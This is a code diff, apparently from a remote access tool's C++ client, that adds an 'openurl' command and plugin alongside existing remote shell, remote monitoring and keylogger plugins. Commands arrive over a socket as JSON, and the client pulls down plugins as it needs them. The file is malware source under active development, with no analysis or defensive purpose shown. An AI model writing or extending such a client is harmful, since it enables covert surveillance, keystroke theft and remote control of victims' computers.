@@ -40,6 +40,7 @@ private:
     const string REMOTE_SHELL_PLUGIN_ID = "RemoteShellPlugin";
     const string REMOTE_MONITORING_PLUGIN_ID = "RemoteMonitoringPlugin";
     const string KEYLOGGER_PLUGIN_ID = "KeyloggerPlugin";
+    const string OPEN_URL_PLUGIN_ID = "OpenURLPlugin";
 
     // Registry helper for initial info
     string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
@@ -97,6 +98,14 @@ private:
         }
     }
 
+    void execute_open_url_command(const json& data) {
+        if (pluginMgr.isPluginLoaded(OPEN_URL_PLUGIN_ID)) {
+            pluginMgr.executePluginCommand(OPEN_URL_PLUGIN_ID, "HandleCommand", sock, data.dump());
+        } else {
+            request_plugin(OPEN_URL_PLUGIN_ID, data);
+        }
+    }
+
     void process_json_command(const string& json_str) {
         try {
             auto data = json::parse(json_str);
@@ -121,6 +130,9 @@ private:
             }
             else if (action == "keylogstart" || action == "keylogstop") {
                 execute_keylogger_command(data);
+            }
+            else if (action == "openurl") {
+                execute_open_url_command(data);
             }
             else if (action == "message" || action == "messagebox") {
 				string title = data.value("title", "System Message");
@@ -200,6 +212,10 @@ private:
                                         pluginMgr.executePluginCommand(KEYLOGGER_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
                                     } else {
                                         pluginMgr.executePlugin(KEYLOGGER_PLUGIN_ID, "RunPlugin", sock);
+                                    }
+                                } else if (pluginId == OPEN_URL_PLUGIN_ID) {
+                                    if (hasPendingPluginCommand) {
+                                        pluginMgr.executePluginCommand(OPEN_URL_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
                                     }
                                 }
                             }
